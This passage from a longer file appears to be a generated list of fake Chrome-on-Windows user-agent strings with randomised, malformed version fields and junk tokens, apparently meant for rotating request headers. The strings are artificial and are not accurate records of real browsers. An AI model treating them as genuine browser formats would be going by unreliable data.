10.0; 10; Win64; x64)N190E) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4579.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T243T) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4582.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M192B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4449.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M388V) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4698.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R604G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4481.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W949F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4856.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W190L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4866.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A68X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4617.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K789C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4708.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O217D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4543.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A875Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4533.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H64V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4268.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R649A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V309L) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4303.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T769C) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4649.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O207X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4867.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I589E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4213.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z350I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B36Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4238.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G519V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4512.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L26U) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4442.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G283U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4806.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S576N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4275.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T500F) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4727.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I955S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4808.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V593U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4255.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P311E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4461.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y106Z) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4729.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N847A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4688.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V346D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4226.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H686O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4578.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L736R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4479.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K948C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4573.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A774O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A515E) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4393.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I401Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B678X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4234.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K778K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4686.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H3R) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A182A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4592.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L84Y) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4876.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S700L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4267.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M906R) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4759.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H562N) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4454.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B617O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4500.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T488Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4520.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C640D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4744.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z836C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H968T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4205.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U605M) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4599.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N17Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4793.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R290J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4269.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C263Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4378.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L828U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4900.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K797H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4675.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y628S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4498.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q429E) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4631.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q902L) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4336.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I516Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4425.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N606C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4421.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K515B) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4694.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L45C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4260.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M817A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4706.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U13T) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4442.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N450Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4239.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K275D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4635.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W687P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4676.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V420I) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4307.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U778P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4440.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S522C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4817.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L96A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4512.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F10L) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4409.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H64M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4650.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J759C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4261.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C995V) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4819.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E479X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4855.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T453I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4302.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M325U) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4867.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E9D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4772.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B601F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4640.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M665F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4214.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F757T) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4787.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H226B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U8P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4377.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J623G) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4430.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U473K) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4646.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N363S) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4709.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H32D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4299.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C37U) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4458.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M155G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4555.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H173G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4663.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S934V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4484.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J672E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4871.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N178V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4737.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W984N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4865.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K156Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4248.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G580I) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4374.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4722.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F743M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4437.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L157E) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4438.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X242N) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4510.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M265O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4580.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X197F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4250.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C290Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4300.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P614C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4650.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A510A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4483.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B434V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4740.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F216G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4517.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C33O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4859.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C485Z) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4516.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S250K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N964I) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4607.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X326J) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4458.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S83U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4242.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R39I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4333.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T751H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4895.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O778Z) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4645.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V621S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4812.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V735P) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4794.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F84B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4379.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N117G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F105T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4251.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N737P) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4414.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V409K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4835.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z952A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4372.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S621C) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4461.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K355W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4896.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T484W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4664.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U241N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4485.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G268V) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4277.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G568F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4333.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W439A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4276.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D641I) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4513.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V139T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4280.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F298W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4654.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F500O) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4419.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A676W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4311.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F62W) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4858.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C208V) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4869.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L943A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4775.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S308L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4342.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G400X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4209.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F131T) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4656.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D821Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4274.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E557S) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F775G) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4789.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U954A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4592.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G492G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4329.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F855V) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4509.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y865A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4775.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K125O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4631.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A994D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4605.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J160C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4272.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J878R) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4200.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E688O) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4451.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q403T) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4322.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R297H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4512.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P633Z) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4581.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C405J) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4539.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P866Z) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4203.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P65E) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4223.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U289K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4419.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O37O) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4850.64 Chrome/105.0.0.0 